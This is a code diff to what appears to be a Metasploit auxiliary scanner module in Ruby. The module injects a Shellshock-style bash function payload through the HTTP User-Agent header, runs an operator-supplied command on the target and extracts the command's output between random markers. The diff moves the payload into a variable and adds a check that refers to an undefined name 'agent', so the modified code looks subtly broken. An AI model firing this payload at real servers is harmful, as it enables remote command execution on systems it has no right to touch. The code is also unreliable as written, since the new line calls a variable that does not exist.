@@ -42,12 +42,15 @@ class Metasploit4 < Msf::Auxiliary
 
   def run_host(ip)
     marker = Rex::Text.rand_text_alphanumeric(rand(42) + 1)
+    user_agent = %Q{() { :; }; echo "#{marker}$(#{datastore['CMD']})#{marker}"}
 
     res = send_request_raw(
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
-      'agent' => %Q{() { :; }; echo "#{marker}$(#{datastore['CMD']})#{marker}"}
+      'agent' => user_agent
     )
+
+    return if (res && res.body.include?(agent))
 
     if res && res.body =~ /#{marker}(.+)#{marker}/m
       print_good("#{peer} - #{$1}")
